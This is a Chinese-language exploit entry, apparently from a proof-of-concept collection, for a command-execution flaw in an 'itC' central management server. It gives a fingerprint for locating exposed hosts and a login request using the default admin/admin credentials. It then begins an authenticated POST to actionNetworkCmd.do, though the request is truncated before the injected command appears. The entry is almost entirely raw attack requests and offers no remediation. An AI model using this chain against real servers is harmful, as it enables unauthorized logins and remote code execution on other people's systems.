# itC中心管理服务器actionNetworkCmd.do存在命令执行漏洞

- **系统**：itC　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/mt\_res\_v3/img/public/logo.ico"`
- **请求**：`POST /frame/actionLogin.do HTTP/1.1`

**请求体 / payload**
```
弱口令：admin/admin
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Priority: u=0
X-Requested-With: XMLHttpRequest
Content-Length: 70
account=admin\&password=21232f297a57a5a743894a0e4a801fc3\&language=zh\_CN
请求体返回为0为正确密码，可登录后台
后台RCE
POST /system/actionNetworkCmd.do HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: JSESSIONID=B15A51589F4122FFBC934F80EB32EDBC; *language*=X19JVENfX3poX0NO; account=X19JVENfX2FkbWlu; meetings=X19JVENfX21vZGlmaWVyPS0xJnNjaGVtZV90eXBlPS0xJnN0YXR1cz0tMSZudW1iZXI9JyZuYW1lPScmc2l6ZT0xO…（脚本共 744 字，完整版见原文）
```
- **预期**：200　|　—